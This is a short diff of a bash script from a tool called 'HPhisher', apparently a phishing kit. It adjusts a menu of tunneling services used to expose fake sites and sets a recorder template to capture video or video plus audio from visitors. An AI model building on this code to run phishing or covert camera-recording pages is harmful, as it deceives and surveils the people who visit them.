@@ -691,10 +691,10 @@ echo -e " "
 echo -e " "
 echo -e "${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
 echo -e " "
-echo -e "	${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
-echo -e "	${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
-echo -e "	${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
-echo -e "	${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
+echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
+echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
+echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
+echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
 echo -e " "
 read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel
 
@@ -835,7 +835,7 @@ case $reply_template in
                 { sleep 1; banner; site_video; };;
 esac
 cd ${sites_dir}/video/${site_template}
-sed "s+mediaType+"$type"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
+sed "s+mediaType+"video"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
 cd ${pro_dir}
 }
 
@@ -874,7 +874,7 @@ case $reply_template in
                 { sleep 1; banner; site_video; };;
 esac
 cd ${sites_dir}/video/${site_template}
-sed "s+mediaType+"$type"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
+sed "s+mediaType+"both"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
 cd ${pro_dir}
 }
 
